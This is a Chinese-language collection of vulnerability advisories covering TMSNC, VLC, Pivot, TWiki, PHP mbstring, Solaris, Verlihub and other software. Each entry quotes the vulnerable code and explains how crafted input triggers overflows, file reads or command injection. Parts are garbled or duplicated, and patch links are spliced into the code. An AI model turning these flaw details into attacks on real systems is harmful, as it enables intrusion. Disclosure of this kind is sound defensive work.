TMSNC是用C编写的基于文本的MSN客户端?TMSNC在处理畸形结构的消息数据时存在漏洞，如果远程攻击者向TMSNC发送了畸形的UBX消息消息的话，就可能触发缓冲区溢出，导致执行任意指令?UBX是类似于UUX的MSN协议，用于通知好友所发生的变化。UBX协议命令的第一个参数为更改了个人消息或当前正在播放歌曲的联络人的护照地址，第二个参数为负载的长度，句法如下：>>> UBX passport@hotmail.com xxx\r\n<Data><PSM>My Personal Message</PSM><CurrentMedia></CurrentMedia></Data>UBX协议是由tmsnc的core_net.c文件中以下代码解析的?727 int728 MSN_server_handle(session, message, message_len)729MSN_session *session;730char *message;731int message_len;732 {733 time_t tm;734 char buf[512], md_hex[48];... while (getline(buf, sizeof(buf) - 1, session->sd) > 0) {...833} else if (strncmp(buf, \"UBX\", 3) == 0) {834 /*835;* we read the payload of this command836*/837/*838* but do not do anything with it839*/840if ((ptr[1] = (char *)split(buf, &#039; &#039;, 1)) == NULL ||//by gfhuang841 (ptr[0] = (char *)split(buf, &#039; &#039;, 2)) == NULL) {842strncpy(message, \"Couldn&#039;t parse UBX\", message_len - 1);843return -1;844 }845 i = atoi(ptr[0]);846; free(ptr[0]);847848if (read(session->sd, buf, i) != i) {849strncpy(message, \"Couldn&#039;t read UBX payload\",850message_len - 1);851return -1;852}853// parsing PSM, by gfhuang854if(0 == i) buf[0] = 0;//important, by gfhuang, when i=0, buf is untouched!?34行消息缓冲区声明为存?12字节的数据，748行读取来自好友联系人的命令行，而如果消息缓冲区包含有类似于以下的UBX消息的话?UBX passport@hotmail.com xxx\r\n (这里xxx为UBX负载长度)就会使用833及之后的行?如果缓冲区的前三个字节匹配UBX且字符串包含有两个传送给ptr[1]和ptr[0]的空间的话，就是一个有效的UBX消息?split函数来自core_misc.c，基本类似于strchr函数，将指针返回给作为第二个参数的第一个字符串。因此在841行的调用后，ptr[0]会指向消息长度，然后?45行使用atoi将这个值转换为整数并在848行传送给read函数，之后通过会话套接字从MSN报文读取UBX负载。因此如果将UBX负载声明为大于sizeof(buffer)或负载长于sizeof(buffer)的话，就会触发栈溢出，导致执行任意指令?       Solaris是一款由Sun开发和维护的商业性质UNIX操作系统?运行在Solaris上的Sun Solstice企业SNMP-DMI映射器子代理守护程序(snmpXdmid(1M))中的安全漏洞可能允许本地或远程非特权用户通过发送畸形报文杀死守护程序进程。如果出现了上述漏洞，snmpXdmid会core dump，core文件的pstack输出类似于：core &#039;core&#039; of 362:     /usr/lib/dmi/snmpXdmid -s <hostname>-----------------  lwp# 2 / thread# 2  --------------------00025cd8 handle_CompLangGrpIndication (7, fef7bde8, 44448, fef7bde8, b0be0, 20) ++ dc00024de0 _dmicomponentadded_0x1_svc (fef7bde8, 49bd0, fef7bde8, fffffff8, 0,   +fef7be11) + 8000250d0 dmi2_client_0x1 (49bd0, b3e68, 1, 0, 74637000, 74637000) + 1dc ff1d15ec _svc_prog_dispatch (b3e68, b0c58, 49bd0, 4ede4, ff1d12e4, 0) + 180ff1d1398 svc_getreq_common (8, 0, 8, 4ede4, ff1d1240, bab68) + d4ff1d12a4 svc_getreq_poll (bab68, 1, ffffffff, 4, 0, bab68) + c400024da0 waitForIndication (0, 0, 0, 0, 0, 0) + 98ff295c94 _lwp_start (0, 0, 0, 0, 0, 0)-----------------  lwp# 1 / thread# 1  --------------------00018d08 main     (0, 31f2c, 31f84, 47800, 0, 0) + 2ec000189d8 _start   (0, 0, 0, 0, 0, 0) + 108       Pivot是一款基于WEB的帮助用户维护动态站点的工具。Pivot的search.php文件没有正确过滤对t参数输入的便返回用于显示文件?..// Set the template for the tags pageif (!isset($Pivot_Vars[&#039;t&#039;]) || empty($Pivot_Vars[&#039;t&#039;])) {if (isset($Weblogs[$Current_weblog][&#039;extra_template&#039;]) && ($Weblogs[$Current_weblog][&#039;extra_template&#039;]!=\"\") ) {$template = $Weblogs[$Current_weblog][&#039;extra_template&#039;]; } else {$template = $Weblogs[$Current_weblog][&#039;archive_template&#039;]; }} else {$template = $Pivot_Vars[&#039;t&#039;];}$template_html = load_template($template); ... &#039;t&#039; argument is passed to load_template() function without checks see load_template() function in /modules/module_parser.php - lines 778-797 ...function load_template($basename) {global $template_cache, $Paths;$filename = $Paths[&#039;templates_path&#039;].$basename;if (isset($template_cache[$basename])) {return $template_cache[$basename];} else {if (!(file_exists($filename))) {$filename = $Paths[&#039;templates_path&#039;].\"entrypage_template.html\";}$filetext=implode(\"\", file($filename)); // <----------------------------|_ lol !!!$template_cache[$basename]=$filetext;return $filetext; }}...参数传送给了file()函数，因此无论php设置如何，都可以通过目录遍历攻击在屏幕看到php文件，包括包含有管理员凭据的配置文件pv_cfg_settings.php?      TWiki是一款灵活易用、功能强大的企业协作平台和知识管理系统?TWiki软件没有正确地验证某些URL输入，如果访问了包含有TWiki配置脚本的URL的话，攻击者就可以读取任意文件?以下?bin/configure脚本中的有漏洞代码：if( $action eq &#039;image&#039; ) {# SMELL: this call is correct, but causes a perl error# on some versions of CGI.pm# print $query->header(-type => $query->param(&#039;type&#039;));# So use this instead:print &#039;Content-type: &#039;.$query->param(&#039;type&#039;).\"\n\n\";if( open(F, &#039;logos/&#039;.$query->param(&#039;image&#039;))) {local $/ = undef;print <F>;(F);}exit 0;}漏洞位于open()函数中。用户可以设?query->param(&#039;type&#039;)，因此可以设置为text/plain。如果将image变量设置为文件路径的话，就可以查看该文件?      美国陆军(America&#039;s Army)是美国军方发布的用于激励征兵的第一人称射击游戏?美国陆军游戏在处理畸形的请求数据时存在漏洞，远程攻击者可能利用此漏洞导致服务不可用。如果远程攻击者向美国陆军游戏服务器发送了单个的特制UDP报文的话，就可能触发拒绝服务的情况：Assertion failed: VoiceIndex<VOICE_MAX_CHATTERS>       ASP.NET是由微软?NET Framework中所提供的，开发Web应用程序的类库，提供ASP.NET网页处理、扩充以及HTTP通道的应用程序与通信处理等工作，以及Web Service的基础架构?带有MS07-040更新的Microsoft .NET Framework中的ASP.NET存在请求验证(又称验证请求过滤?漏洞?由于没有正确地检测出危险的客户端输入，这使得远程攻击者可以通过构造特定的STYLE元件，包含\"</\"序列的query string可以触发该漏洞，执行跨站脚本攻击?      ASP.NET是由微软?NET Framework中所提供的，开发Web应用程序的类库，提供ASP.NET网页处理、扩充以及HTTP通道的应用程序与通信处理等工作，以及Web Service的基础架构?带有MS07-040更新的Microsoft .NET Framework中的ASP.NET存在请求验证(又称验证请求过滤?漏洞?由于没有正确地检测出危险的客户端输入，远程攻击者可以通过构造特定的STYLE元件，包含\"<~/\"序列的query string可以触发该漏洞，执行跨站脚本攻击?      Linux Kernel是开放源码操作系统Linux所使用的内核?RHEL4/5内核处理POSIX锁定时fcntl调用可能与关闭相同文件描述符出现竞争，本地攻击者可以利用这个漏洞导致拒绝服务或获得权限提升?fcntl以如下方式获得POSIX锁定?sys_fcntl()fget()do_fcntl()fcntl_setlk()fput()if(!count) __fput()locks_remove_flock()fcntl_setlk()调用可能阻塞很长时间，允许同一进程中的其他线程关闭文件描述符：sys_close()filp_close()locks_remove_posix()fput()if(!count) __fput()locks_remove_flock()如果其中一个线程仍在fcntl_setlk中阻断期间但在许可锁定之?在将file_lock结构放置到inode的i_lock列表之前)从另一个线程关闭了文件描述符，关闭路径中的locks_remove_posix调用就会错过POSIX锁定。此时还无法调用locks_remove_flock，因为fcntl_setlk中线程仍持有对文件的引用?当__fput调用locks_remove_flock时，sys_fcntl返回路径的最终fput可以触发漏洞?/* * This function is called on the last close of an open file. */void locks_remove_flock(struct file *filp){ [...]while ((fl = *before) != NULL) {if (fl->fl_file == filp) {if (IS_FLOCK(fl)) {locks_delete_lock(before);continue;}if (IS_LEASE(fl)) {lease_modify(before, F_UNLCK);continue;}if (IS_POSIX(fl))continue;/* What? */BUG(); <----}before = &fl->fl_next;}unlock_kernel();}       MySQL是一款使用非常广泛的开放源代码关系数据库系统，拥有各种平台的运行版本?mysql命令行客户端工具没有在输出中引用\"&\"、\"<\"、\">\"、\"\"\"等特殊HTML字符，如果远程攻击者拥有向表格写入数据的权限的话，就可以在输出中注入JavaScript等代码。当用户查看恶意数据库项的HTML输出时，就会在浏览器会话中执行注入的脚本代码?      VLC Media Player是一款免费的媒体播放器?VLC媒体播放器在解析畸形的cue文件时存在栈溢出漏洞，以下是modules\access\vcd\cdrom.c文件中的有漏洞代码段?[...]913 /* Try to parse the i_tracks and p_sectors info so we can just forget914  * about the cuefile */915 if( i_ret == 0 )916 {917 [1] int p_sectors[100];918     int i_tracks = 0;919     int i_num;920     char psz_dummy[10];921922 [2] while( fgets( line, 1024, cuefile ) )923     {924       /* look for a TRACK line */925       if( !sscanf( line, \"%9s\", psz_dummy ) ||926           strcmp(psz_dummy, \"TRACK\") )927           continue;928929       /* look for an INDEX line */930 [3]   while( fgets( line, 1024, cuefile ) )931       {932          int i_min, i_sec, i_frame;933934 [4]      if( (sscanf( line, \"%9s %2u %2u:%2u:%2u\", psz_dummy, &i_num,935                  &i_min, &i_sec, &i_frame ) != 5) || (i_num != 1) )936             continue;937938 [5]      i_tracks++;939 [6]      p_sectors[i_tracks - 1] = MSF_TO_LBA(i_min, i_sec, i_frame);940          msg_Dbg( p_this, \"vcd track %i begins at sector:%i\",941                   i_tracks - 1, p_sectors[i_tracks - 1] );942          break;943       }944     }[...][1] 这个栈缓冲区可能被溢?[2] + [3] 将cue文件中用户控制的数据存储到了line[4] 解析用户控制的数据并拷贝到i_min、i_sec和i_frame[5] i_tracks计数器递增[6] 来自i_min、i_sec和i_frame的用户控制数据拷贝到了栈缓冲区p_sectors并将i_tracks用作数组索引。由于i_tracks没有上限，可以通过在cue文件中指定大量音轨溢出p_sectors栈缓冲区?此外VLC媒体播放器在解析畸形的rt字幕文件时存在另一个栈溢出。以下是modules\demux\subtitle.c文件中的有漏洞代码段?[...]1843  static int ParseRealText( demux_t *p_demux, subtitle_t *p_subtitle,   int i_idx )1844  {1845     VLC_UNUSED( i_idx );1846     demux_sys_t *p_sys = p_demux->p_sys;1847     text_t      *txt = &p_sys->txt;1848     char *psz_text = NULL;1849 [1] char psz_end[12]= \"\", psz_begin[12] = \"\";18501851     for( ;; )1852     {1853        int h1 = 0, m1 = 0, s1 = 0, f1 = 0;1854        int h2 = 0, m2 = 0, s2 = 0, f2 = 0;1855        const char *s = TextGetLine( txt );1856        free( psz_text );18571858        if( !s )1859            return VLC_EGENERIC;18601861        psz_text = malloc( strlen( s ) + 1 );1862        if( !psz_text )1863            return VLC_ENOMEM;18641865        /* Find the good begining. This removes extra spaces at the 1866           beginning of the line.*/1867        char *psz_temp = strcasestr( s, \"<time\");1868        if( psz_temp != NULL )1869        {1870            /* Line has begin and end */1871 [2]        if( ( sscanf( psz_temp,1872                  \"<%*[t|T]ime %*[b|B]egin=\\"%[^\\"]\\"  %*[e|E]nd=\\"%[^\\"]%*[^>]%[^\n\r]\",1873                            psz_begin, psz_end, psz_text) != 3 ) &&1874                    /* Line has begin and no end */1875 [3]                ( sscanf( psz_temp,1876                              \"<%*[t|T]ime         %*[b|B]egin=\\"%[^\\"]\\"%*[^>]%[^\n\r]\",1877                              psz_begin, psz_text ) != 2) )1878                /* Line is not recognized */1879            {1880                continue;1881            }[...][1] 栈缓冲区psz_end和psz_begin可能被溢?[2] sscanf()函数从psz_temp所指向的用户控制字符串读取输入，未经任何边界检查便将用户控制的数据被存储到了psz_end和psz_begin?[3] 同[2]  char *s,*mailbox,tmp[MAILTMPLEN],path[MAILTMPLEN];   STRING st;    struct stat sbuf;                                  /* have a mailbox specifier? */    if (mailbox = strchr (user,&#039;+&#039;)) {      *mailbox++ = &#039;\0&#039;;          /* yes, tie off user name */      if (!*mailbox || !strcmp (\"INBOX\",ucase (strcpy (tmp,mailbox))))        mailbox = NIL;            /* user+ and user+INBOX same as user */     }   (..)user+folder命令行参数分别通过s和user字符指针到达deliver()和getusername()。folder部分与user部分分离并拷贝到tmp缓冲区。由于该缓冲区位于栈上，超长的文件夹名称就可以导致覆盖栈上数据?      VLC Media Player是一款免费的媒体播放器?VLC媒体播放器在解析畸形的cue文件时存在栈溢出漏洞，以下是modules\access\vcd\cdrom.c文件中的有漏洞代码段?[...]913 /* Try to parse the i_tracks and p_sectors info so we can just forget914  * about the cuefile */915 if( i_ret == 0 )916 {917 [1] int p_sectors[100];918     int i_tracks = 0;919     int i_num;920     char psz_dummy[10];921922 [2] while( fgets( line, 1024, cuefile ) )923     {924       /* look for a TRACK line */925       if( !sscanf( line, \"%9s\", psz_dummy ) ||926           strcmp(psz_dummy, \"TRACK\") )927           continue;928929       /* look for an INDEX line */930 [3]   while( fgets( line, 1024, cuefile ) )931       {932          int i_min, i_sec, i_frame;933934 [4]      if( (sscanf( line, \"%9s %2u %2u:%2u:%2u\", psz_dummy, &i_num,935                  &i_min, &i_sec, &i_frame ) != 5) || (i_num != 1) )936             continue;937938 [5]      i_tracks++;939 [6]      p_sectors[i_tracks - 1] = MSF_TO_LBA(i_min, i_sec, i_frame);940          msg_Dbg( p_this, \"vcd track %i begins at sector:%i\",941                   i_tracks - 1, p_sectors[i_tracks - 1] );942          break;943       }944     }[...][1] 这个栈缓冲区可能被溢?[2] + [3] 将cue文件中用户控制的数据存储到了line[4] 解析用户控制的数据并拷贝到i_min、i_sec和i_frame[5] i_tracks计数器递增[6] 来自i_min、i_sec和i_frame的用户控制数据拷贝到了栈缓冲区p_sectors并将i_tracks用作数组索引。由于i_tracks没有上限，可以通过在cue文件中指定大量音轨溢出p_sectors栈缓冲区?此外VLC媒体播放器在解析畸形的rt字幕文件时存在另一个栈溢出。以下是modules\demux\subtitle.c文件中的有漏洞代码段?[...]1843  static int ParseRealText( demux_t *p_demux, subtitle_t *p_subtitle, int i_idx )1844  {1845     VLC_UNUSED( i_idx );1846     demux_sys_t *p_sys = p_demux- >p_sys;1847     text_t      *txt = &p_sys- >txt;1848     char *psz_text = NULL;1849 [1] char psz_end[12]= \"\", psz_begin[12] = \"\";18501851     for( ;; )1852     {1853        int h1 = 0, m1 = 0, s1 = 0, f1 = 0;1854        int h2 = 0, m2 = 0, s2 = 0, f2 = 0;1855        const char *s = TextGetLine( txt );1856        free( psz_text );18571858        if( !s )1859            return VLC_EGENERIC;18601861        psz_text = malloc( strlen( s ) + 1 );1862        if( !psz_text )1863            return VLC_ENOMEM;18641865        /* Find the good begining. This removes extra spaces at the 1866           beginning of the line.*/1867        char *psz_temp = strcasestr( s, \"<time\");1868        if( psz_temp != NULL )1869        {1870            /* Line has begin and end */1871 [2]        if( ( sscanf( psz_temp,1872                  \"<%*[t|T]ime %*[b|B]egin=\\"%[^\\"]\\" %*[e|E]nd=\\"%[^\\"]%*[^ >]%[^\n\r]\",1873                            psz_begin, psz_end, psz_text) != 3 ) &&1874                    /* Line has begin and no end */1875 [3]                ( sscanf( psz_temp,1876                              \"<%*[t|T]ime   %*[b|B]egin=\\"%[^\\"]\\"%*[^ >]%[^\n\r]\",1877                              psz_begin, psz_text ) != 2) )1878                /* Line is not recognized */1879            {1880                continue;1881            }[...][1] 栈缓冲区psz_end和psz_begin可能被溢?[2] sscanf()函数从psz_temp所指向的用户控制字符串读取输入，未经任何边界检查便将用户控制的数据被存储到了psz_end和psz_begin?[3] 同[2]}       IBM Tivoli Netcool Service Quality Manager是IBM Tivoli服务质量管理解决方案的核心软件?Tivoli Netcool Service Quality Manager的Web接口中存在多个跨站脚本漏洞，已认证的用户可以使用报表生成功能创建名称中嵌入了恶意代码的报表，当在主面板中打开报表历史时就会在用户浏览器会话中执行注入的代码?至少有以下三个页面存在漏洞：* http://server/<document\"  root>/ReportTree* http://server/<document\"  root>/Launch* http://server/<document\"  root>/ReportRequest       GeSHi是用php编写的通用语法荧光笔，是一个编程辅助工具，支持PHP、HTML、C等语言?                                                        GeSHi 1.0.8之前的版本中的geshi.php的加强功能，允许远程攻击者借助包含一个只有开放的分隔符没有关闭的分隔符的一个XML序列，引起拒绝服?(无限循环)?例如使用\"<\"?      VLC Media Player是一款免费的媒体播放器?VLC媒体播放器的modules/demux/real.c文件中的ReadRealIndex()函数在解析RealMedia(.rm)文件时存在最终可能导致堆溢出的整数溢出漏洞：[...]891 static void ReadRealIndex( demux_t *p_demux )892 {...900 uint32_t i_index_count;...920 [1] i_index_count = GetDWBE( &buffer[10] );...931 [2] p_sys->p_index = 932 (rm_index_t *)malloc( sizeof( rm_index_t ) * (i_index_count+1) );933 if( p_sys->p_index == NULL )934 return;935936 memset(p_sys->p_index, 0, sizeof(rm_index_t) * (i_index_count+1));937938 [3] for( i=0; i<i_index_count; i++ )939 {940 if( stream_Read( p_demux->s, buffer, 14 ) < 14 )941 return ;942943 [7] if( GetWBE( &buffer[0] ) != 0 )944 {945 msg_Dbg( p_demux,  Real Index: invaild version of index entry %d  ,946 GetWBE( &buffer[0] ) );947 return;948 }949950 [4] p_sys->p_index[i].time_offset = GetDWBE( &buffer[2] );951 [5] p_sys->p_index[i].file_offset = GetDWBE( &buffer[6] );952 [6] p_sys->p_index[i].frame_index = GetDWBE( &buffer[10] );953 msg_Dbg( p_demux,  Real Index: time %d file %d frame %d  ,954 p_sys->p_index[i].time_offset,955 p_sys->p_index[i].file_offset,956 p_sys->p_index[i].frame_index );957958 }959 }[...][1] 将从RealMedia文件获得的用户控制数据拷贝到了i_index_count?[2] i_index_count的值用于计算堆缓冲区的大小。如果该值足够大(?x15555555)，就可能在计算堆缓冲区大小时出现整数溢出，因此可能会分配较小的堆缓冲区?[3] i_index_count的值用作这个for()循环中的计数器?[4] 将从RealMedia文件获得的用户控制数据拷贝到了之前分配的堆缓冲区。由于i用作的数组索引，在i < i_index_count之前会执行for()循环，因此可以通过用户控制的数据覆盖堆缓冲区?[5] 参考[4][6] 参考[4]由于还可以触发能够在任意点停止溢出的退出条?见[7])，这可能导致完全可控的堆溢出。远程攻击者可以以VLC环境执行任意代码?      TWiki是一款灵活易用、功能强大的企业协作平台和知识管理系统?%URLPARAM{}% TWiki变量是用于创建动态wiki内容和wiki应用的命令。如果未经正确的编码便在HTML表单字段值中使用了URLPARAM的话，就可能导致跨站脚本攻击攻击。例如： <input type=\"text&\" name=\"city&\" value=\"%URLPARAM{ \"city\" }%\" />攻击者可以创建city URL参数，用双引号括起input value=\"\"属性，然后添加其他属性?      Clam AntiVirus是Unix的GPL杀毒工具包，很多邮件网关产品都在使用?ClamAV的jpeg解析代码中存在递归栈溢出漏洞。如果用户扫描到了恶意的jpeg文件或文件缩略图，就会在没有检查递归限制的情况下调用有漏洞的cli_check_jpeg_exploit函数，触发栈溢出。以下是clamav-0.94\libclamav\special.c文件中的有漏洞代码段?int cli_check_jpeg_exploit(int fd) <-- fd to jpeg file{...             if ((retval=jpeg_check_photoshop(fd)) != 0) {                           return retval;                      }...}...static int jpeg_check_photoshop(int fd){...                retval = jpeg_check_photoshop_8bim(fd);...}...static int jpeg_check_photoshop_8bim(int fd){...        retval = cli_check_jpeg_exploit(fd); <-- calls cli_check_jpeg_exploit()again without any recursive checks !...}    <   QEMU和KVM都是开放源码的模拟器软件。Qemu和KVM的VNC服务器在处理特制的报文时可能出现死循环，导致拒绝服务的情况?PHP是广泛使用的通用目的脚本语言，特别适合于Web开发，可嵌入到HTML中。PHP的mbstring扩展的ext/mbstring/libmbfl/filters/mbfilter_htmlent.c文件中存在堆溢出漏洞，远程攻击者可以通过包含有HTML实体的特制字符串来触发这个溢出，导致执行任意代码。以下是mbfilter_htmlent.c中有问题的HTML实体解码器，这里解码器实现为一个回调函数，输入字符串中的每个字符都会用包含有解码器状态的结构(mbfl_convert_filter)顺序调用该回调函数。mbfl_convert_filter中的output_function字段指向一个函数，解码后的数据逐字符的传送给该函数，在出现错误的时候函数应返回负值，但如果参数是没有分配给任何字符的Unicode值时就可能失效。具体来说，由于output_function的符号是int(*)(int, void *)而缓冲区是无符字符数组，因此任何大于127的字符代码都会在将其值取反后传送给该函数，导致无条件的失效?-----------------------------------------------------------------------------#define CK(statement)   do { if ((statement) > 0) return (-1); } while (0)...int mbfl_filt_conv_html_dec(int c, mbfl_convert_filter *filter){   if (!filter-<status) {        ...    } else {        if (c == &#039;;&#039;) {            ...        } else {           /* add character */            buffer[filter-<status++] = c;            /* add character and check */            if (!strchr(html_entity_chars, c) ||filter-<status+1==html_enc_buffer_size || (c==&#039;#&#039; && filter-<status<2))            {               /* illegal character or end of buffer */               if (c==&#039;&&#039;)                   filter-<status--;               buffer[filter-<status] = 0;                /* php_error_docref(\"ref.mbstring\" TSRMLS_CC, E_WARNING,\"mbstring cannot decode &#039;目前厂商已经发布了升级补丁以修复这个安全问题，补丁下载链接：<a href=\"http://cvs.php.net/viewvc.cgi/php-src/ext/mbstring/libmbfl/filters/mbfilter_htmlent.c?r1=1.7&r2=1.8\" target=\"_blank\" rel=\"nofollow\">http://cvs.php.net/viewvc.cgi/php-src/ext/mbstring/libmbfl/filters/mbfilter_htmlent.c?r1=1.7&r2=1.8</a>&#039;\", buffer)l */               mbfl_filt_conv_html_dec_flush(filter);                if (c==&#039;&&#039;)                {                   filter-<status = 1;                   buffer[0] = &#039;&&#039;;               }            }        }    }}int mbfl_filt_conv_html_dec_flush(mbfl_convert_filter *filter){    int status, pos = 0;    char *buffer;   buffer = (char*)filter-<opaque;    status = filter-<status;    /* flush fragments */    while (status--) {        CK((*filter-<output_function)(buffer[pos++], filter-<data));    }    filter-<status = 0;    /*filter-<buffer = 0; of cause NOT*/    return 0;}------------------------------------------------------------------------------如果用户输入中的字符序列包含有一个或多个不属于html_entity_chars的字符，在mbfl_filt_conv_html_dec_flush()中调用输出函数就会失败。由于CK()宏中的返回语句，这可能导致未经重置filter-<status就回到调用函数，最终允许随意的访问mbfl_filt_conv_html_dec()中的缓冲区?   <   Verlihub是运行在Linux操作系统上的Direct Connect协议服务器。Verlihub没有正确地过滤通过trigger机制传送给shell的用户输入，此外Verlihub守护程序还可能配置为以root用户权限运行，这就允许连接到hub的用户通过提交恶意请求执行任意命令，或允许本地攻击者通过?tmp/trigger.tmp临时文件的符号链接攻击覆盖任意文件。以下是src/ctrigger.cpp文件的cTrigger::DoIt()函数中的有漏洞代码段?     106  string command(buf);                                                   107  filename = server.mConfigBaseDir;                                        108  filename.append(\"/tmp/trigger.tmp\");                               109  command.append(\" < \");                                           110  command.append(filename);                                         111  cout >> command >> endl;                                           112  system(command.c_str());       Verlihub是运行在Linux操作系统上的Direct Connect协议服务器。Verlihub没有正确地过滤通过trigger机制传送给shell的用户输入，此外Verlihub守护程序还可能配置为以root用户权限运行，这就允许连接到hub的用户通过提交恶意请求执行任意命令，或允许本地攻击者通过?tmp/trigger.tmp临时文件的符号链接攻击覆盖任意文件。以下是src/ctrigger.cpp文件的cTrigger::DoIt()函数中的有漏洞代码段?     106  string command(buf);                                                   107  filename = server.mConfigBaseDir;                                        108  filename.append(\"/tmp/trigger.tmp\");                               109  command.append(\" < \");                                           110  command.append(filename);                                         111  cout >> command >> endl;                                           112  system(command.c_str());       MSN messenger是Windows操作系统默认捆绑的即时消息聊天客户端?如果在NAT会话上使用了MSN协议版本15(MSNP15)，Windows Live Messenger客户端允许远程攻击者通过读取Ipv4ExternalAddrsAndPorts、Ipv4InternalAddrsAndPorts头字段找到内部IP地址和端口号?在聊天会话期间MSN除了传送会话id、Cal等信息外，还会传送Ipv4ExternalAddrsAndPorts、Ipv4InternalAddrsAndPorts，分别代表公开的IP地址和会话者的私有IP地址及端口逻辑。以下是会话的全过程?MSNMSGR:aaaa@hotmail.it MSNSLP/1.0To: <msnmsgr:aaaa@hotmail.it>From: <msnmsgr:<a href=\"mailto:bbbbbb@hotmail.it\">bbbbbb@hotmail.it>Via: MSNSLP/1.0/TLP ;branch={D4CE435D-8C31-4D80-80EC-576A8294B3B3}CSeq: 0Call-ID: {00000000-0000-0000-0000-000000000000}Max-Forwards: 0Content-Type: application/x-msnmsgr-transudpswitchContent-Length: 157IPv4ExternalAddrsAndPorts: 79.2.165.233:3939IPv4InternalAddrsAndPorts: 192.168.0.2:3939SessionID: 729003413SChannelState: 0Capabilities-Flags: 1######A#########g#######g#######&para;8&raquo;#############INVITEMSNMSGR:<a href=\"mailto:aaa@hotmail.it\">aaa@hotmail.it MSNSLP/1.0To: <msnmsgr:aaaa@hotmail.it>From: <msnmsgr:<a href=\"mailto:bbbb@hotmail.it\">bbbb@hotmail.it>Via: MSNSLP/1.0/TLP ;branch={31DB585D-3119-40AF-B02B-3D9BAEF32CD0}CSeq: 0Call-ID: {9A68685A-1FCF-86A1-B639-BA769BA9B514}Max-Forwards: 0Content-Type: application/x-msnmsgr-transreqbodyContent-Length: 270Bridges: TRUDPv1 TCPv1 SBBridge TURNv1NetID: -375061937Conn-Type: Port-Restrict-NATTCP-Conn-Type: Port-Restrict-NATUPnPNat: trueICF: falseHashed-Nonce: {D8F5EEB9-2568-FAE8-9460-3FF8DB908381}SessionID: 275007100SChannelState: 0Capabilities-Flags: 1#####MSG 49 D 155MIME-Version: 1.0Content-Type: application/x-msnmsgrp2pP2P-Dest: <a href=\"mailto:bbbb@hotmail.it\">bbbb@hotmail.it####_       Openfire(原名为Wildfire)是一个采用Java开发的跨平台开源实时协?RTC)服务器?在对openfire管理接口的认证中，Tomcat应用服务器中的过滤器org.jivesoftware.admin.AuthCheckFilter确保仅有通过认证的用户才可以访问管理接口，否则将会被重新定向到登录页面。Openfire中的一个错误可能导致无需管理用户凭据便访问内部功能?部署描述?web.xml)配置了一些AuthCheckFilter的exclude值：<filter>  <filter-name>AuthCheck</filter-name> <filter-class>org.jivesoftware.admin.AuthCheckFilter</filter-class> <init-param> <param-name>excludes</param-name>  <param-value>login.jsp,index.jsp?logout=true,setup/index.jsp, setup/setup-,.gif,.png,error-serverdown.jsp</param-value> </init-param></filter>如果请求URL包含有任意Exclude字符串的话，就可以绕过检查机制?       Google Chrome是Google发布的一款浏览器。Chrome的SaveAs函数在保存恶意页面时存在栈溢出漏洞，如果用户受骗访问网页的HTML文件中包含有超长<title>标签的话，则保存该页面时就会触发这个溢出，导致在用户系统上执行任意指令?      BIND是由ISC提供的一个常用的DNS软件，它支持动态DNS更新(参考IETF RFC 2136<http://tools.ietf.org/html/rfc2136>)?OpenSSL是一种开放源码的SSL实现，用来实现网络通信的高强度加密，现在被广泛地用于各种网络应用程序中?BIND 没有正确处理函数OpenSSL DSA_verify返回值，使系统存在安全绕过漏洞。远程攻击者可以通过为DSA和ECDSA key伪造SSL/TLS签名绕过证书链表符合性检查?   <   Solaris是一款由Sun开发和维护的商业性质UNIX操作系统。Solaris内核中用于在32位模式系统上处理SYS_kaio系统调用请求的代码存在整数溢出漏洞，本地攻击者可以利用这个漏洞导致由于内核忙碌而触发的系统崩溃。由于所有的Solaris区共享相同的内核，因此即使由普通的非全局区触发也可以导致整个系统崩溃?/uts/common/os/aio.c中的源码：[..]221 static int64_t222 kaioc(223        long  a0,224        long  a1,225        long  a2,226        long  a3,227        long  a4,228        long  a5)229 {230        int  error;231        long rval = 0;232233        switch ((int)a0 & ~AIO_POLL_BIT) {...266        case AIOSUSPEND:267 [1]        error = aiosuspend((void *)a1, (int)a2, (timespec_t *)a3,268                (int)a4, &rval, AIO_64);269            break;[..][1] aiosuspend()函数的a1、a2、a3和a4参数是受控的?uts/common/os/aio.c中的源码：[..]897   static int898   aiosuspend(899          void   *aiocb,900          int    nent,901          struct timespec   *timout,902          int    flag,903          long   *rval,904          int    run_mode)905   {...925        aiop = curproc->p_aio;926 [2]    if (aiop == NULL || nent <= 0)927               return (EINVAL);...951        if (model == DATAMODEL_NATIVE)952 [3]           ssize = (sizeof (aiocb_t *) * nent);953      #ifdef    _SYSCALL32_IMPL954        else955 [3]           ssize = (sizeof (caddr32_t) * nent);956      #endif  /* _SYSCALL32_IMPL */957 958 [4]    cbplist = kmem_alloc(ssize, KM_NOSLEEP);[..][2] 由于nent是受控的，如果nent > 0就可以绕过这个检查[3] 使用用户控制的nent值计算ssize值，对nent提供0x3fffffff值就可以触发整数溢出，导致ssize = 0x00000000。在[4]处用0x00000000长度值调用kmem_alloc()函数，kmem_alloc()函数本身?x00000000值调用vmem_alloc()，该函数用相同的size值调用vmem_xalloc()?lib/libumem/common/vmem.c中的源码：[..]815 void *816 vmem_xalloc(vmem_t *vmp, size_t size, size_t align, size_t phase,817   size_t nocross, void *minaddr, void *maxaddr, int vmflag)818 {...934 [6]  if (size == 0)935         umem_panic(\"vmem_xalloc(): size == 0\");[..][6] 如果向vmem_xalloc()函数提供?x00000000的size值就会导致内核忙碌?      Ruby是一种功能强大的面向对象的脚本语言。Ruby没有正确地验证X.509证书，在ext/openssl/ossl_ocsp.c文件中以如下方式使用openssl函数：result = OCSP_basic_verify(bs, x509s, x509st, flg);sk_X509_pop_free(x509s, X509_free);if(!result) rb_warn(\"目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接?a href=\"http://lists.apple.com/archives/security-announce/2009/May/msg00002.html\" target=\"_blank\" rel=\"nofollow\">http://lists.apple.com/archives/security-announce/2009/May/msg00002.html</a>\", ERR_error_string(ERR_peek_error(), NULL));return result ? Qtrue : Qfalse;OCSP_basic_verify()在出错的情况下可能返??1，因此这个函数可能错误的返回信息。成功利用这个漏洞的攻击者可以导致将已撤销的x.509证书处理为有效，这有助于执行网络钓鱼或站点欺骗攻击?      VMWare是一款虚拟PC软件，允许在一台机器上同时运行两个或多个Windows、DOS、LINUX系统?VMWare的hcmon.sys驱动没有过滤用户态通过METHOD_NEITHER发送的指针?.text:00011606 loc_11606: .text:00011606 mov eax, [ebp+SystemBuffer].text:00011609 mov [ebp+SystemBuffer2], eax.text:0001160C mov ecx, [ebp+SystemBuffer2].text:0001160F mov edx, [ecx+0Ch] <---- BUGCHECK.text:00011612 cmp edx, [ebp+var_20].text:00011615 jnz short loc_11629.text:00011617 cmp 